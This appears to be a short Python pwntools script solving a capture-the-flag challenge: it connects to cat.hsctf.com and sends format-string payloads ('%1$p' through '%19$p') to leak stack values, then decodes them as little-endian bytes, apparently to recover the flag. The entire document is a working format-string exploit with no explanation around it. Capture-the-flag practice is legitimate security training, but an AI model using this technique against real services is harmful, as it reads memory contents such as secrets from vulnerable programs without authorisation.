from pwn import *

io = remote('cat.hsctf.com', 1337)

for i in range(1,20):
    io.sendline(f'%{i}$p'.encode())
    leak = io.recvline(keepends=False)[2:]
    if b'il)' in leak:
        continue
    print(bytes.fromhex(leak.decode().rjust(16,'0'))[::-1])
    #print(leak.decode().rjust(16,'0'))